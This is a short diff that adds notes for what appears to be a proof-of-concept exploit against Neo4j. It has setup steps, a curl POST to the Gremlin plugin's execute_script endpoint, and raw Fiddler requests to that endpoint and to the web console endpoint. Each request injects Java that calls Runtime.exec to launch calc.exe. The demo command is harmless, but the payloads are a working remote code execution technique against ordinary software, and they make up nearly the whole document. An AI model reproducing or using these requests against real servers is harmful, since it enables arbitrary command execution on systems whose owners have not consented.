@@ -1,0 +1,29 @@
+install neo4j
+
+run neo4j.bat
+
+curl -X POST http://localhost:7474/db/data/ext/GremlinPlugin/graphdb/execute_script -d '{"script":"import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"c:/Windows/System32/calc.exe\")", "params": {} }' -H "Content-Type: application/json"
+
+
+in fiddler:
+
+
+http://localhost:7474/db/data/ext/GremlinPlugin/graphdb/execute_script
+
+User-Agent: Fiddler
+Host: localhost:7474
+Content-Type: application/json
+Content-Length: 117
+ 
+{"script":"import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"c:/Windows/System32/calc.exe\")", "params": {} }
+
+
+
+
+http://localhost:7474/db/manage/server/console/
+
+Accept: application/json, text/javascript, */*
+Host: localhost:7474
+Content-Length: 98
+
+{"command":"rt = Runtime.getRuntime().exec(\"c:/Windows/System32/calc.exe\");","engine":"gremlin"}
